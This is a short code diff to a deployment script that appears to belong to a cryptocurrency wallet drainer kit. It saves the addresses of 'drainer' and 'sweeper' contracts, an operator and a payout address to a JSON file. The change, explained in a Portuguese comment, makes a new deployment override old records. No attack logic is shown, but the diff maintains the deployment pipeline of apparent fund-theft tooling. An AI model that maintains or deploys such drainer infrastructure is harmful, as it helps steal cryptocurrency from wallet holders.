@@ -32,7 +32,8 @@ if (payout !== wallet.address) {
 }
 
 const data = { drainer: drainerAddress, sweeper: sweeperAddress, operator: wallet.address, payout, chainId: Number((await provider.getNetwork()).chainId) };
-if (existsSync(".deployments.json")) Object.assign(data, JSON.parse(readFileSync(".deployments.json", "utf8")), data);
-writeFileSync(".deployments.json", JSON.stringify(data, null, 2));
+// o deploy NOVO tem de vencer; antes o merge deixava o arquivo antigo ganhar e o deploy local ficava invisivel
+const merged = existsSync(".deployments.json") ? { ...JSON.parse(readFileSync(".deployments.json", "utf8")), ...data } : data;
+writeFileSync(".deployments.json", JSON.stringify(merged, null, 2));
 
-console.log(JSON.stringify(data, null, 2));
+console.log(JSON.stringify(merged, null, 2));
